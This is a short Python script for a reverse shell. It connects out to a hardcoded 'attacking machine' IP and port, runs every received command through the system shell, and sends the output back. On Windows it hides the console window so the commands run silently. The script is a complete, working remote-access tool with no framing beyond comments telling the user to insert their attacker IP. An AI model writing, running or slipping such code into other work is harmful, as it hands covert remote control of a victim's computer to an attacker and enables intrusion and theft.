import socket
import subprocess
import sys

def client(target_ip, target_port):
    s = socket.socket()
    s.connect((target_ip, target_port))

    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() in ['exit', 'quit']:
            break
        if cmd.strip() == '':
            continue

        # Run command silently on Windows
        startupinfo = None
        creationflags = 0

        if sys.platform == "win32":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            creationflags = subprocess.CREATE_NO_WINDOW

        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            startupinfo=startupinfo,
            creationflags=creationflags
        )

        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)

    s.close()

if __name__ == '__main__':
    # Hardcoded target server IP and port
    TARGET_IP = '192.168.1.100'    # Replace with your attacking machine IP
    TARGET_PORT = 9999             # Replace with your listening port

    client(TARGET_IP, TARGET_PORT)
